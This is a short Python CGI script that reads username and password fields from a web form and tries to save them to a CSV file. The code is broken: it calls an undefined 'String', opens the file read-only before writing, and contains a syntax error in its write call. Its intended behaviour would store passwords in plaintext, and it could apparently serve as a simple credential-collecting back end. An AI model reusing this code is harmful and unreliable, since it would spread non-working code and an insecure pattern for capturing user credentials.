#!/usr/bin/python

import cgi


form = cgi.FieldStorage()

"""
try:
	#catch username 
	uname = form['username'].value
	url = form['URL'].value
except KeyError as E:
	pass
""" 
if form.getvalue("username"): 
	uname = form.getvalue("username")
if form.getvalue("password"): 
	pwd = form.getvalue("password")
	
	
  
uname, pwd = map(String, uname.split(',')) 

f = open("usernamePwd.csv","rb")
f.write(uname; pwd) 
f.close() 

 
